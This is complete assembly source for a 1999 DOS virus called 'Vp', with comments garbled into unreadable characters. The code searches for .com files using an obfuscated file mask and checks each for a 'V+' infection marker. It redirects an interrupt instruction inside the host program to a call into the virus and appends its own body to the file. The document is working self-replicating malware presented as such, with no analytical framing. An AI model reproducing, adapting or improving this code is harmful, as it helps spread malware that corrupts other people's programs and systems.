   ;‚¨àãá Vp 06.07.1999 (c) CrkV

   .model tiny
   .code
   .286
       Org 100h
   Vp:
       Call    $ + 3
   Entry_Point:
       PushF               ;ä« £¨ â®¦¥ c®åà ¨¬
       PushA               ;á®åà ¨¬ ¢á¥ à¥£¨áâàë
           Mov Bp,Sp
           Sub Word Ptr [Bp+18],03h
       Mov Di,[Bp+18]      ;¯®«ãç¨âì  ¤à¥á ¢®§¢à â 
       Push    Ds
       Push    Es

       Call    $+3
   Size1   EQU $ - Offset Entry_Point

   My_Point:
       Pop Bp                      ;Bp:=Offset My_Point
       Mov Cs:[Bp+Save_Sp],Sp
       Mov Cs:[Bp+Save_Ss],Ss

       Push    Cs
       Push    Cs
       Push    Cs
       Pop Ds
       Pop Es
       Pop Ss          ;Cli ¥ ã¦¥
       Lea Sp,[Bp+Vir_Stack]

       Lea Si,[Bp+Save_Byte]
       Cld
       MovSW
       MovSB
       Mov Ah,2Fh          ;Get DTA
       Int 21h

   ;   Add Si,Save_DTA
       LodSW

       Mov [Si],Bx         ;‘®åà ï¥¬ DTA
       Mov [Si+02h],Es

       Push    Cs
       Pop Es

   ;   Lea Si,[Bp+Mask_Com]
       Sub Si,11

       Lea Di,[Bp+Real_Mask]
       Push    Di
       Mov Cx,03h
   @Next:  LodSW
       Xor Ax,'+V'
       StoSW
       Loop    @Next

       Mov Ah,1Ah          ;Set DTA
   ;   Lea Dx,[Bp+New_DTA]
       Mov Dx,Di

   Int21h  EQU $ - Offset My_Point

       Int 21h         ;ãáâ  ¢«¨¢ ¥¬ á¢®î DTA

       Mov Ah,4Eh          ;Find_First
       Mov Cx,0FEh
       Pop Dx

   @Find_File:
       Int 21h
       Jnc @Check_File
       LDs Dx,[Bp+Save_DTA2]
       Mov Ah,1Ah          ;Set DTA
       Int 21h         ;‚®ááâ  ¢«¨¢ ¥¬ ¯à®£à ¬¬ãî DTA
       Cli
       Mov Sp,[Bp+Save_Sp]
       Mov Ss,[Bp+Save_Ss]
       Pop Es
       Pop Ds
       PopA                ;‚®ááâ  ¢«¨¢ ¥¬ à¥£¨áâàë
       PopF
       Ret             ;‚ëå®¤¨¬ ¨§ ¢¨àãá 

   ;---------------------------------------
   @Check_File:
       Mov Ax,3D02h        ;Open File
       Lea Dx,[Bp+New_DTA+1Eh] ; ©¤¥®¥ ¨¬ï ¢ DTA
       Int 21h
       Jc  @Exit_Check
       Xchg    Bx,Ax           ;Bx:=Ax (File Handle)
       Call    Set_FP          ;  ¢ëå®¤¥ Dx:Ax - à §¬¥à ä ©« 

       Cmp Ax,0100h
       Jbe @Not_Infected       ;ä ©« ¬ «®¢ â
       Cmp Ax,0E000h
       Jnb @Not_Infected       ;  ¢®â íâ®â ¢¥«¨ª ;-))

       Mov Di,Ax
       Dec Ax
       Dec Ax
       Xchg    Dx,Ax
       Mov Al,00h
       Call    Set_FP2         ;ãáâ  ¢«¨¢ ¥¬ ãª.   ª®¥æ ä ©«  - 2
       Mov Ah,3Fh          ;Read File
       Lea Si,[Bp+Buffer]
       Mov Dx,Si
       Mov Cl,02h
       Int 21h         ;‘ç¨â ¥¬ 2 ¡ ©â 
       Cmp Word Ptr [Si],'+V'  ;V+ - ¬¥âª  ¢¨àãá 
       Je  @Not_Infected       ;¢®§¬®¦® § à ¦¥
       Mov Al,00h
       Call    Set_FP1
       Call    Infect
   @Not_Infected:
       Mov Ah,3Eh          ;Close File
       Int 21h
   @Exit_Check:
       Mov Ah,4Fh          ;Find Next
       Jmp @Find_File
   ;---------------------------------------
   Set_FP: Mov Al,02h
   Set_FP1:Sub Dx,Dx
   Set_FP2:Sub Cx,Cx
       Mov Ah,42h
       Int 21h
       Ret
   ;---------------------------------------
   Infect  Proc
       Push    Di
       Mov Ah,3Fh          ;Read File
       Mov Ch,01h          ;Cl=0
       Mov Dx,Si
       Int 21h         ;‘ç¨âë¢ ¥¬ 256 ¡ ©â
       LodSB

       Cmp Al,0E9h         ;Jmp ?
       Je  @Ok_Jmp

       Cmp Al,0EBh
       Je  @Jmp_Short

       Push    0
       Dec Si
       Jmp @Not_Jmp

   @Jmp_Short:
       LodSB
       Cbw
       Jmp @Jmps


   @Ok_Jmp:
       LodSW
       Dec Si

   @Jmps:
       Push    Ax
       Xchg    Dx,Ax
       Dec Si
       Dec Si
       Mov Al,00h
       Call    Set_FP2
       Mov Ah,3Fh          ;Read File
       Mov Ch,01h
       Mov Dx,Si
       Int 21h         ;‘ç¨â ¥¬ 256 ¡ ©â ®â ¯¥à¥å®¤ 
   @Not_Jmp:

       Mov Di,Si

   @Next_Scan:
       Mov Al,0CDh
       Repne   ScasB
       Jz  @Ok_Scan

   @Exit_Infect:
       Pop Di
       Pop Di
       Ret

   @Ok_Scan:
       Mov Ax,[Di]
       Cmp Al,10h
       Je  @Now_Infected
       Cmp Al,20h
       Je  @Now_Infected
       Cmp Al,21h
       Je  @Now_Infected
       Cmp Al,27h
       Jnz @Next_Scan

   @Now_Infected:

       Mov [Bp+Save_Byte+1],Ax
       Lea Dx,[Di-Buffer-1]
       Sub Dx,Bp
       Pop Ax
       Add Dx,Ax
       Push    Dx
       Mov Al,00h
       Call    Set_FP2         ;âãâ ¡ã¤¥â ¯¥à¥å®¤   â¥«® ¢¨àãá 
       Pop Dx
       Pop Ax
       Sub Ax,Dx
       Sub Ax,03h          ;¢ëç¨á«ï¥¬ á¬¥é¥¨¥ ¤«ï Call ¢¨àãá
       Mov Byte Ptr [Di-1],0E8h    ;Call My_Point
       Mov Dx,Di
       Dec Dx
       StoSW
       Mov Ah,40h          ;Write File
       Mov Cx,03h
       Int 21h         ;‡ ¯¨á «¨ ª®¬ ¤ã ¯¥à¥å®¤ 
       Call    Set_FP
       Mov Cx,Vir_Lenght
       Mov Ah,40h          ;Write_File
       Lea Dx,[Bp-Size1]
       Int 21h         ;„®¯¨á «¨ ¢¨àãá
       Ret
   Infect  EndP
   ;---------------------------------------
   Mask_Com    EQU $ - Offset My_Point

       db  '*' Xor 'V'
       db  '.' Xor '+'
       db  'c' Xor 'V'
       db  'o' Xor '+'
       db  'm' Xor 'V'
       db  00h Xor '+'

   Save_Byte   EQU $ - Offset My_Point
       db  0CDh
       dw  2020h
   StrVp   db  'V+'

   Vir_Lenght  EQU $ - Offset Entry_Point  ;1DBh
   ;---------------------------------------
   ;¢ ¯à¨æ¨¯¥ SP ¬®¦¥â ¡ëâì ¨ ¥ç¥â®¥
   Vir_Stack   EQU ((($ - Offset Entry_Point)Shr 1) Shl 1) + 500h
   ;---------------------------------------
   Save_Dta2   EQU $ - Offset My_Point
       dd  ?
   Save_Sp     EQU $ - Offset My_Point
       dw  ?
   Save_Ss     Equ $ - Offset My_Point
       dw  ?
   Real_Mask   EQU $ - Offset My_Point
       db  6   Dup (?)
   New_DTA     EQU $ - Offset My_Point

   Buffer      EQU Vir_Lenght + 100h
   ;---------------------------------------
       End Vp
